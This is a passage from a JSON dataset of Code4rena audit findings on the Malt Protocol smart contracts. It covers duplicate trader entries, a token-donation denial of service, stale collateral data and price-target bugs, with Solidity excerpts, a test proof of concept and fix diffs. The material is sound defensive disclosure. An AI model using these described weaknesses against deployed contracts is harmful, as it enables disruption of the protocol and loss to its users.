      "summary": "\nThis bug report is about the vulnerability in the code of the StabilityPod/SwingTraderManager.sol file. The vulnerability is that the code does not validate that each trader should have a unique traderContract, which can lead to several functions like buyMalt() and sellMalt() not working as expected. This is because the functions work according to traders' balances, and if a traderContract is duplicated, it will receive more shares than it can manage. The bug was identified through manual review. To mitigate the issue, it is recommended to add a new mapping, such as activeTraderContracts, to check if the contract has already been added. This would ensure that the same traderContract can only be added once.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/34",
      "tags": [],
      "finders": [
        "minhquanym",
        "hansfriese"
      ]
    },
    {
      "id": "16081",
      "title": "[M-03] `LinearDistributor.declareReward` can revert due to dependency of balance",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L147-L151> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L185-L186> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L123-L136>\n\n### Impact\n\n`LinearDistributor.declareReward` will revert and it can cause permanent DOS.\n\n### Proof of Concept\n\nIn `LinearDistributor.declareReward`, if the balance is greater than the bufferRequirement, the rest will be forfeited.\n\n        if (balance > bufferRequirement) {\n          // We have more than the buffer required. Forfeit the rest\n          uint256 net = balance - bufferRequirement;\n          _forfeit(net);\n        }\n\nAnd in `_forfeit`, it requires forfeited (= balance - bufferRequirement) <= declaredBalance.\n\n      function _forfeit(uint256 forfeited) internal {\n        require(forfeited <= declaredBalance, \"Cannot forfeit more than declared\");\n\nSo when an attacker sends some collateral tokens to `LinearDistributor`, the balance will be increased and it can cause revert in `_forfeit` and `declareReward`.\n\nSince `declareReward` sends vested amount before `_forfeit` and the vested amount will be increased by time, so this DOS will be temporary.\n\n        uint256 distributed = (linearBondedValue * netVest) / vestingBondedValue;\n        uint256 balance = collateralToken.balanceOf(address(this));\n\n        if (distributed > balance) {\n          distributed = balance;\n        } \n\n        if (distributed > 0) {\n          // Send vested amount to liquidity mine\n          collateralToken.safeTransfer(address(rewardMine), distributed);\n          rewardMine.releaseReward(distributed);\n        }\n\n        balance = collateralToken.balanceOf(address(this));\n\nBut if the attacker increases the balance enough to cover all reward amount in vesting, `declareReward` will always revert and it can cause permanent DOS.\n\n`decrementRewards` updates `declaredBalance`, but it only decreases `declaredBalance`, so it can't mitigate the DOS.\n\n### Recommended Mitigation Steps\n\nTrack collateral token balance and add sweep logic for unused collateral tokens in `LinearDistributor`.\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/35#issuecomment-1443598496):**\n > As this is a DOS scenario where funds are not at risk and the chances that rewards are lost forever are low, downgrading to Medium.\n\n**[0xScotch (Malt) confirmed and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/35#issuecomment-1446998892):**\n > I agree this is a DOS vector but a continued attack would require the attacker to spend more and more capital. Should be fixed but doesn't pose any risk of material loss.\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LinearDistributor contract of the RewardSystem. It can cause a permanent Denial of Service (DOS) attack. The attack works by sending some collateral tokens to the LinearDistributor contract which increases the balance, and then calling the declareReward function. This will cause a revert in the _forfeit function, as the balance is greater than the bufferRequirement. The _forfeit function requires that the amount forfeited is less than or equal to the declaredBalance. Since the declareReward function sends vested amount before calling the _forfeit function, and the vested amount will increase over time, this DOS attack will be temporary. However, if the attacker increases the balance enough to cover all reward amount in vesting, the declareReward function will always revert and cause a permanent DOS. The decrementRewards function updates the declaredBalance, but it only decreases it, so it can't mitigate the DOS.\n\nThe recommended mitigation step is to track the collateral token balance and add a sweep logic for unused collateral tokens in the LinearDistributor contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/35",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "16080",
      "title": "[M-02] The latest malt price can be less than the actual price target and `StabilizerNode.stabilize` will revert",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L188> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L201-L203>\n\n### Impact\n\n`StabilizerNode.stabilize` will revert when `latestSample < priceTarget`.\n\n### Proof of Concept\n\nIn StabilizerNode.stabilize, when `exchangeRate > priceTarget` and `_msgSender` is not an admin and not whitelisted, it asserts `livePrice > minThreshold`.\n\nAnd `minThreshold` is calculated as follows:\n\n        uint256 priceTarget = maltDataLab.getActualPriceTarget();\n\n<!---->\n\n            uint256 latestSample = maltDataLab.maltPriceAverage(0);\n            uint256 minThreshold = latestSample -\n              (((latestSample - priceTarget) * sampleSlippageBps) / 10000);\n\nThis code snippet assumes that `latestSample >= priceTarget`. Although `exchangeRate > priceTarget`, `exchangeRate` is the malt average price during `priceAveragePeriod`. But `latestSample` is one of those malt prices. So `latestSample` can be less than `exchangeRate` and `priceTarget`, so `stabilize` will revert in this case.\n\n### Recommended Mitigation Steps\n\nUse `minThreshold = latestSample + (((priceTarget - latestSample) * sampleSlippageBps) / 10000)` when `priceTarget > latestSample`.\n\n**[0xScotch (Malt) confirmed and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/36#issuecomment-1446996158):**\n > We actually do want the tx to revert when `latestSample < priceTarget` as that means the most recent sample in the price average feed is below peg but we are in the above peg stabilization flow in the code. However, we do not want the revert to be subtraction overflow as that looks like something went wrong. So we should handle with an explicit error.\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the code of the StabilizerNode contract, which is part of the StabilityPod project. The code snippet assumes that the latest sample of malt prices is greater than or equal to the price target. However, if the exchange rate is greater than the price target and the sender of the message is not an admin or whitelisted, it will assert that the live price is greater than the minThreshold. The minThreshold is calculated by subtracting the difference between the latest sample and the price target from the latest sample. This could cause the `stabilize` function to revert if the latest sample is less than the price target.\n\nThe bug was found using manual review. To mitigate this issue, the code should use `minThreshold = latestSample + (((priceTarget - latestSample) * sampleSlippageBps) / 10000)` when `priceTarget > latestSample`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/36",
      "tags": [],
      "finders": [
        "minhquanym",
        "hansfriese"
      ]
    },
    {
      "id": "16079",
      "title": "[M-01] `priceTarget` is inconsistent in `StabilizerNode.stabilize`",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L178-L182> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L294-L298> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L188>\n\n### Impact\n\n`priceTarget` is inconsistent in `StabilizerNode.stabilize` so `stabilize` can do auction instead of selling malt and vice versa.\n\n### Proof of Concept\n\nIn `StabilizerNode.stabilize`, there is an early check using `_shouldAdjustSupply` function.\n\n        if (!_shouldAdjustSupply(exchangeRate, stabilizeToPeg)) {\n          lastStabilize = block.timestamp;\n          impliedCollateralService.syncGlobalCollateral();\n          return;\n        }\n\nIn `_shouldAdjustSupply`, `priceTarget` is calculated by `stabilizeToPeg` and then check if `exchangeRate` is outside of some margin of `priceTarget`.\n\n        if (stabilizeToPeg) {\n          priceTarget = maltDataLab.priceTarget();\n        } else {\n          priceTarget = maltDataLab.getActualPriceTarget();\n        }\n\nBut in `stabilize`, `priceTarget` is always actual price target of `maltDataLab` regardless of `stabilizeToPeg`.\nAnd it decides selling malt or doing auction by the `priceTarget`. So when `stabilizeToPeg` is true, `priceTarget` (= actual price target) can be different from `maltDataLab.priceTarget()` in most cases, and it can cause wrong decision of selling or starting auction after that.\n\n        uint256 priceTarget = maltDataLab.getActualPriceTarget();\n\nSo when `stabilizeToPeg` is true, `stabilize` can do auction instead of selling malt, or vice versa.\n\n### Recommended Mitigation Steps\n\nUse same logic as `_shouldAdjustSupply` for `priceTarget`. `priceTarget` should be `maltDataLab.priceTarget()` in `stabilize` when `stabilizeToPeg` is true.\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/40)**\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the code of the StabilityPod/StabilizerNode.sol contract. When the \"stabilizeToPeg\" parameter is set to true, the \"priceTarget\" variable is always set to the actual price target of the maltDataLab, regardless of what the maltDataLab.priceTarget() is. This can lead to incorrect decisions being made by the contract, such as doing an auction instead of selling malt, or vice versa. The recommended mitigation step is to use the same logic as the \"_shouldAdjustSupply\" function for the \"priceTarget\" variable, and to set it to maltDataLab.priceTarget() when \"stabilizeToPeg\" is true.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/40",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "16078",
      "title": "[H-06] StabilizerNode.stabilize uses stale GlobalImpliedCollateralService data, which will make stabilize incorrect",
      "impact": "HIGH",
      "content": "\nIn StabilizerNode.stabilize, `impliedCollateralService.syncGlobalCollateral()` is called only at the end of the function to synchronize the GlobalImpliedCollateralService data.\n\n```solidity\n    if (!_shouldAdjustSupply(exchangeRate, stabilizeToPeg)) {\n      lastStabilize = block.timestamp;\n      impliedCollateralService.syncGlobalCollateral();\n      return;\n    }\n...\n    if (trackAfterStabilize) {\n      maltDataLab.trackPool();\n    }\n    impliedCollateralService.syncGlobalCollateral();\n    lastStabilize = block.timestamp;\n  }\n```\n\nsyncGlobalCollateral will use the data in `getCollateralizedMalt()`, which includes the collateralToken balance in overflowPool/swingTraderManager/liquidityExtension and the malt balance in swingTraderManager.\n\n```solidity\n  function syncGlobalCollateral() public onlyActive {\n    globalIC.sync(getCollateralizedMalt());\n  }\n...\n  function getCollateralizedMalt() public view returns (PoolCollateral memory) {\n    uint256 target = maltDataLab.priceTarget();\n\n    uint256 unity = 10**collateralToken.decimals();\n\n    // Convert all balances to be denominated in units of Malt target price\n    uint256 overflowBalance = maltDataLab.rewardToMaltDecimals((collateralToken.balanceOf(\n      address(overflowPool)\n    ) * unity) / target);\n    uint256 liquidityExtensionBalance = (collateralToken.balanceOf(\n      address(liquidityExtension)\n    ) * unity) / target;\n    (\n      uint256 swingTraderMaltBalance,\n      uint256 swingTraderBalance\n    ) = swingTraderManager.getTokenBalances();\n    swingTraderBalance = (swingTraderBalance * unity) / target;\n```\n\nSince StabilizerNode.stabilize will use the results of maltDataLab.getActualPriceTarget/getSwingTraderEntryPrice to stabilize, and maltDataLab.getActualPriceTarget/getSwingTraderEntryPrice will use `GlobalImpliedCollateralService.collateralRatio`, to ensure correct stabilization, the data in GlobalServiceImpliedCollateralService should be the latest.\n\n```solidity\n  function getActualPriceTarget() external view returns (uint256) {\n    uint256 unity = 10**collateralToken.decimals();\n    uint256 icTotal = maltToRewardDecimals(globalIC.collateralRatio());\n...\n  function getSwingTraderEntryPrice()\n    external\n    view\n    returns (uint256 stEntryPrice)\n  {\n    uint256 unity = 10**collateralToken.decimals();\n    uint256 icTotal = maltToRewardDecimals(globalIC.collateralRatio());\n```\n\nBut since `impliedCollateralService.syncGlobalCollateral()` is not called before StabilizerNode.stabilize calls maltDataLab.getActualPriceTarget/getSwingTraderEntryPrice, this will cause StabilizerNode.stabilize to use stale GlobalImpliedCollateralService data, which will make stabilize incorrect.\n\nA simple example would be:\n\n1.  `impliedCollateralService.syncGlobalCollateral()` is called to synchronize the latest data\n2.  SwingTraderManager.delegateCapital is called, and the collateralToken is taken out from SwingTrader, which will make the `GlobalImpliedCollateralService.collateralRatio` larger than the actual collateralRatio.\n\n```solidity\n  function delegateCapital(uint256 amount, address destination)\n    external\n    onlyRoleMalt(CAPITAL_DELEGATE_ROLE, \"Must have capital delegation privs\")\n    onlyActive\n  {\n    collateralToken.safeTransfer(destination, amount);\n    emit Delegation(amount, destination, msg.sender);\n  }\n...\n  function collateralRatio() public view returns (uint256) {\n    uint256 decimals = malt.decimals();\n    uint256 totalSupply = malt.totalSupply();\n    if (totalSupply == 0) {\n      return 0;\n    }\n    return (collateral.total * (10**decimals)) / totalSupply; // @audit: collateral.total is larger than the actual\n  }\n```\n\n3.  When StabilizerNode.stabilize is called, it will use the stale collateralRatio for calculation. If the collateralRatio is too large, the results of maltDataLab.getActualPriceTarget/getSwingTraderEntryPrice will be incorrect, thus making stabilize incorrect.\n\nSince stabilize is a core function of the protocol, stabilizing with the wrong data is likely to cause malt to be depegged, so the vulnerability should be High risk.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L161-L237> \n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/ImpliedCollateralService.sol#L89-L131>\n\n### Recommended Mitigation Steps\n\nCall `impliedCollateralService.syncGlobalCollateral()` before StabilizerNode.stabilize calls maltDataLab.getActualPriceTarget.\n\n```diff\n  function stabilize() external nonReentrant onlyEOA onlyActive whenNotPaused {\n    // Ensure data consistency\n    maltDataLab.trackPool();\n\n    // Finalize auction if possible before potentially starting a new one\n    auction.checkAuctionFinalization();\n\n+  impliedCollateralService.syncGlobalCollateral();\n\n    require(\n      block.timestamp >= stabilizeWindowEnd || _stabilityWindowOverride(),\n      \"Can't call stabilize\"\n    );\n    stabilizeWindowEnd = block.timestamp + stabilizeBackoffPeriod;\n\n    // used in 3 location.\n    uint256 exchangeRate = maltDataLab.maltPriceAverage(priceAveragePeriod);\n    bool stabilizeToPeg = onlyStabilizeToPeg; // gas\n\n    if (!_shouldAdjustSupply(exchangeRate, stabilizeToPeg)) {\n      lastStabilize = block.timestamp;\n      impliedCollateralService.syncGlobalCollateral();\n      return;\n    }\n\n    emit Stabilize(block.timestamp, exchangeRate);\n\n    (uint256 livePrice, ) = dexHandler.maltMarketPrice();\n\n    uint256 priceTarget = maltDataLab.getActualPriceTarget();\n```\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/9)**\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the StabilizerNode contract of the 2023-02-malt project on Github. The vulnerability is caused by the fact that the syncGlobalCollateral() function is called only at the end of the stabilize() function, which means that the GlobalImpliedCollateralService data used in stabilize() may not be the latest. This could lead to incorrect stabilization, which could cause malt to be depegged.\n\nThe proof of concept for this vulnerability is provided in the Github repository, and no tools are required. The recommended mitigation step is to call impliedCollateralService.syncGlobalCollateral() before StabilizerNode.stabilize calls maltDataLab.getActualPriceTarget. This would ensure that the latest data is used in the stabilization process.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/9",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "16077",
      "title": "[H-05] `_distributeProfit` will use the stale `globalIC.swingTraderCollateralDeficit()/swingTraderCollateralRatio()`, which will result in incorrect profit distribution",
      "impact": "HIGH",
      "content": "\nThe `\\_distributeProfit()` (called by handleProfit()) will use `globalIC.swingTraderCollateralDeficit()/swingTraderCollateralRatio()` when distributing profits, and the latest `globalIC.swingTraderCollateralDeficit()/swingTraderCollateralRatio()` needs to be used to ensure that profits are distributed correctly.\n\n```solidity\n    uint256 globalSwingTraderDeficit = (maltDataLab.maltToRewardDecimals(\n      globalIC.swingTraderCollateralDeficit()\n    ) * maltDataLab.priceTarget()) / (10**collateralToken.decimals());\n\n    // this is already in collateralToken.decimals()\n    uint256 lpCut;\n    uint256 swingTraderCut;\n\n    if (globalSwingTraderDeficit == 0) {\n      lpCut = distributeCut;\n    } else {\n      uint256 runwayDeficit = rewardThrottle.runwayDeficit();\n\n      if (runwayDeficit == 0) {\n        swingTraderCut = distributeCut;\n      } else {\n        uint256 totalDeficit = runwayDeficit + globalSwingTraderDeficit;\n```\n\nHowever, the two calls to handleProfit in the contract do not call syncGlobalCollateral to synchronize the data in globalIC.\n\nsyncGlobalCollateral will use the data in `getCollateralizedMalt()`, including the collateralToken balance in overflowPool/swingTraderManager/liquidityExtension and the malt balance in swingTraderManager.\n\n      function syncGlobalCollateral() public onlyActive {\n        globalIC.sync(getCollateralizedMalt());\n      }\n\n      function getCollateralizedMalt() public view returns (PoolCollateral memory) {\n        uint256 target = maltDataLab.priceTarget(); // 是否选用  getActualPriceTarget()\n\n        uint256 unity = 10**collateralToken.decimals();\n\n        // Convert all balances to be denominated in units of Malt target price\n        uint256 overflowBalance = maltDataLab.rewardToMaltDecimals((collateralToken.balanceOf(\n          address(overflowPool)\n        ) * unity) / target);\n        uint256 liquidityExtensionBalance = (collateralToken.balanceOf(\n          address(liquidityExtension)\n        ) * unity) / target;\n        (\n          uint256 swingTraderMaltBalance,\n          uint256 swingTraderBalance\n        ) = swingTraderManager.getTokenBalances();\n        swingTraderBalance = (swingTraderBalance * unity) / target;\n\n1.  Before handleProfit is called by StabilizerNode.stabilize.\n\n```solidity\n    profitDistributor.handleProfit(rewards);\n```\n\na. checkAuctionFinalization is called to liquidityExtension.allocateBurnBudget, which transfers the collateralToken from liquidityExtension to swingTrader. The increase of collateralToken in swingTrader will make the data in globalIC stale.\n\n```solidity\nfunction allocateBurnBudget(uint256 amount)\n    external\n    onlyRoleMalt(AUCTION_ROLE, \"Must have auction privs\")\n    onlyActive\n    returns (uint256 purchased)\n  {\n    // Send the burnable amount to the swing trader so it can be used to burn more malt if required\n    require(\n      collateralToken.balanceOf(address(this)) >= amount,\n      \"LE: Insufficient balance\"\n    );\n    collateralToken.safeTransfer(address(swingTrader), amount);\n\n    emit AllocateBurnBudget(amount);\n  }\n```\n\nb. swingTraderManager.sellMalt will exchange malt for collateralToken, and the increase of collateralToken in swingTrader will also make the data in globalIC stale.\n\n```solidity\n    uint256 swingAmount = swingTraderManager.sellMalt(tradeSize);\n```\n\n2.  Before SwingTrader.sellMalt is called to handleProfit.\n\n```solidity\n  function _handleProfitDistribution(uint256 profit) internal virtual {\n    if (profit != 0) {\n      collateralToken.safeTransfer(address(profitDistributor), profit);\n      profitDistributor.handleProfit(profit);\n    }\n  }\n```\n\na. dexHandler.sellMalt will exchange malt for collateralToken, and the increase of collateralToken in swingTrader will also make the data in globalIC stale.\n\n```solidity\n    malt.safeTransfer(address(dexHandler), maxAmount);\n    uint256 rewards = dexHandler.sellMalt(maxAmount, 10000);\n\n```\n\nOne obvious effect is that as the collateralToken in swingTrader increases, collateral.swingTrade will be smaller than it actually is, and the result of `globalIC.swingTraderCollateralDeficit()` will be larger than it should be.\n\n```solidity\n  function swingTraderCollateralDeficit() public view returns (uint256) {\n    // Note that collateral.swingTrader is already denominated in malt.decimals()\n    uint256 maltSupply = malt.totalSupply();\n    uint256 collateral = collateral.swingTrader; // gas\n\n    if (collateral >= maltSupply) {\n      return 0;\n    }\n\n    return maltSupply - collateral;\n  }\n```\n\nthus making lpCut larger:\n\n```solidity\n    uint256 globalSwingTraderDeficit = (maltDataLab.maltToRewardDecimals(\n      globalIC.swingTraderCollateralDeficit()\n    ) * maltDataLab.priceTarget()) / (10**collateralToken.decimals());\n\n    // this is already in collateralToken.decimals()\n    uint256 lpCut;\n    uint256 swingTraderCut;\n\n    if (globalSwingTraderDeficit == 0) {\n      lpCut = distributeCut;\n    } else {\n      uint256 runwayDeficit = rewardThrottle.runwayDeficit();\n\n      if (runwayDeficit == 0) {\n        swingTraderCut = distributeCut;\n      } else {\n        uint256 totalDeficit = runwayDeficit + globalSwingTraderDeficit;\n\n        uint256 globalSwingTraderRatio = maltDataLab.maltToRewardDecimals(\n          globalIC.swingTraderCollateralRatio()\n        );\n\n        // Already in collateralToken.decimals\n        uint256 poolSwingTraderRatio = impliedCollateralService\n          .swingTraderCollateralRatio();\n\n        if (poolSwingTraderRatio < globalSwingTraderRatio) {\n          swingTraderCut = (distributeCut * swingTraderPreferenceBps) / 10000;\n          lpCut = distributeCut - swingTraderCut;\n        } else {\n          lpCut =\n            (((distributeCut * runwayDeficit) / totalDeficit) *\n              (10000 - lpThrottleBps)) /\n            10000;\n```\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/ProfitDistributor.sol#L164-L184> \n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L423-L424> \n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/SwingTrader.sol#L176-L181>\n\n### Recommended Mitigation Steps\n\nCall syncGlobalCollateral to synchronize the data in globalIC before calling handleProfit.\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/9)**\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the ProfitDistributor.sol contract, which affects the distribution of profits. The vulnerability occurs when handleProfit() is called without first calling syncGlobalCollateral() to synchronize the data in globalIC. This is because when collateralToken is transferred to the swingTrader, the data in globalIC becomes stale. This can cause the result of globalIC.swingTraderCollateralDeficit() to be larger than it should be, which can result in lpCut being larger than it should be. \n\nThe proof of concept can be found in the Github links provided in the report. No additional tools were used. \n\nThe recommended mitigation step is to call syncGlobalCollateral to synchronize the data in globalIC before calling handleProfit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/10",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "16076",
      "title": "[H-04] SwingTraderManager.addSwingTrader will push traderId with `active = false` to activeTraders",
      "impact": "HIGH",
      "content": "\nIn SwingTraderManager.addSwingTrader, if `active = false`, the traderId is also pushed to activeTraders.\n\n```solidity\n  function addSwingTrader(\n    uint256 traderId,\n    address _swingTrader,\n    bool active,\n    string calldata name\n  ) external onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\") {\n    SwingTraderData storage trader = swingTraders[traderId];\n    require(traderId > 2 && trader.id == 0, \"TraderId already used\");\n    require(_swingTrader != address(0), \"addr(0)\");\n\n    swingTraders[traderId] = SwingTraderData({\n      id: traderId,\n      index: activeTraders.length,\n      traderContract: _swingTrader,\n      name: name,\n      active: active\n    });\n\n    activeTraders.push(traderId);\n\n    emit AddSwingTrader(traderId, name, active, _swingTrader);\n  }\n```\n\nAfterwards, if toggleTraderActive is called on the traderId, the traderId will be pushed to activeTraders again.\n\n```solidity\n  function toggleTraderActive(uint256 traderId)\n    external\n    onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\")\n  {\n    SwingTraderData storage trader = swingTraders[traderId];\n    require(trader.id == traderId, \"Unknown trader\");\n\n    bool active = !trader.active;\n    trader.active = active;\n\n    if (active) {\n      // setting it to active so add to activeTraders\n      trader.index = activeTraders.length;\n      activeTraders.push(traderId);\n    } else {\n```\n\nThis means that in `getTokenBalances()/calculateSwingTraderMaltRatio()`, since there are two identical traderIds in activeTraders, the data in this trader will be calculated twice.\n\nWrong `getTokenBalances()` will result in wrong data when `syncGlobalCollateral()`.\n\n```solidity\n  function getTokenBalances()\n    external\n    view\n    returns (uint256 maltBalance, uint256 collateralBalance)\n  {\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];\n      maltBalance += malt.balanceOf(trader.traderContract);\n      collateralBalance += collateralToken.balanceOf(trader.traderContract);\n    }\n  }\n```\n\nWrong `calculateSwingTraderMaltRatio()` will cause `MaltDataLab.getRealBurnBudget()/getSwingTraderEntryPrice()` to be wrong.\n\n```solidity\n  function calculateSwingTraderMaltRatio()\n    public\n    view\n    returns (uint256 maltRatio)\n  {\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n    uint256 decimals = collateralToken.decimals();\n    uint256 maltDecimals = malt.decimals();\n    uint256 totalMaltBalance;\n    uint256 totalCollateralBalance;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];\n      totalMaltBalance += malt.balanceOf(trader.traderContract);\n      totalCollateralBalance += collateralToken.balanceOf(\n        trader.traderContract\n      );\n    }\n\n    totalMaltBalance = maltDataLab.maltToRewardDecimals(totalMaltBalance);\n\n    uint256 stMaltValue = ((totalMaltBalance * maltDataLab.priceTarget()) /\n      (10**decimals));\n\n    uint256 netBalance = totalCollateralBalance + stMaltValue;\n\n    if (netBalance > 0) {\n      maltRatio = ((stMaltValue * (10**decimals)) / netBalance);\n    } else {\n      maltRatio = 0;\n    }\n  }\n```\n\nWhat's more serious is that even if toggleTraderActive is called again, only one traderId will pop up from activeTraders, and the other traderId cannot be popped up.\n\n```solidity\n    } else {\n      // Becoming inactive so remove from activePools\n      uint256 index = trader.index;\n      uint256 lastTrader = activeTraders[activeTraders.length - 1];\n\n      activeTraders[index] = lastTrader;\n      activeTraders.pop();\n\n      swingTraders[lastTrader].index = index;\n      trader.index = 0;\n    }\n```\n\nThis causes the trade to participate in the calculation of `getTokenBalances()/calculateSwingTraderMaltRatio()` even if the trade is deactive.\n\nConsidering that the active parameter is likely to be false when addSwingTrader is called and cannot be recovered, this vulnerability should be High risk.\n\n### Proof of Concept\n\n```solidity\n  function testAddSwingTrader(address newSwingTrader) public {\n    _setupContract();\n    vm.assume(newSwingTrader != address(0));\n    vm.prank(admin);\n    swingTraderManager.addSwingTrader(3, newSwingTrader, false, \"Test\");\n\n    (\n      uint256 id,\n      uint256 index,\n      address traderContract,\n      string memory name,\n      bool active\n    ) = swingTraderManager.swingTraders(3);\n\n    assertEq(id, 3);\n    assertEq(index, 2);\n    assertEq(traderContract, newSwingTrader);\n    assertEq(name, \"Test\");\n    assertEq(active, false);\n    vm.prank(admin);\n    swingTraderManager.toggleTraderActive(3);\n    assertEq(swingTraderManager.activeTraders(2),3);\n    assertEq(swingTraderManager.activeTraders(3),3); // @audit:activeTraders[2] = activeTraders[3] = 3\n    vm.prank(admin);\n    swingTraderManager.toggleTraderActive(3);\n    assertEq(swingTraderManager.activeTraders(2),3);\n  }\n```\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/SwingTraderManager.sol#L397-L447>\n\n### Recommended Mitigation Steps\n\nChange to:\n\n```diff\n  function addSwingTrader(\n    uint256 traderId,\n    address _swingTrader,\n    bool active,\n    string calldata name\n  ) external onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\") {\n    SwingTraderData storage trader = swingTraders[traderId];\n    require(traderId > 2 && trader.id == 0, \"TraderId already used\");\n    require(_swingTrader != address(0), \"addr(0)\");\n\n    swingTraders[traderId] = SwingTraderData({\n      id: traderId,\n-     index: activeTraders.length,\n+     index: active ? activeTraders.length : 0,\n      traderContract: _swingTrader,\n      name: name,\n      active: active\n    });\n+  if(active) activeTraders.push(traderId);\n\n-   activeTraders.push(traderId);\n\n    emit AddSwingTrader(traderId, name, active, _swingTrader);\n  }\n```\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/12)**\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the SwingTraderManager.addSwingTrader() function of the StabilityPod contract. If active is set to false, the traderId is still pushed to the activeTraders array. This means that in getTokenBalances()/calculateSwingTraderMaltRatio(), the data in this trader will be calculated twice. This can lead to wrong data when syncGlobalCollateral() is called, which in turn can cause MaltDataLab.getRealBurnBudget()/getSwingTraderEntryPrice() to be wrong. Furthermore, if toggleTraderActive is called again, only one traderId will pop up from activeTraders, and the other traderId cannot be popped up.\n\nA proof of concept has been provided to demonstrate the issue. The recommended mitigation steps are to change the code of the addSwingTrader() function so that the traderId is only pushed to activeTraders if active is true.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/12",
      "tags": [],
      "finders": [
        "cccz",
        "hansfriese"
      ]
    },
    {
      "id": "16075",
      "title": "[H-03] Manipulation of `livePrice` to receive `defaultIncentive` in 2 consecutive blocks",
      "impact": "HIGH",
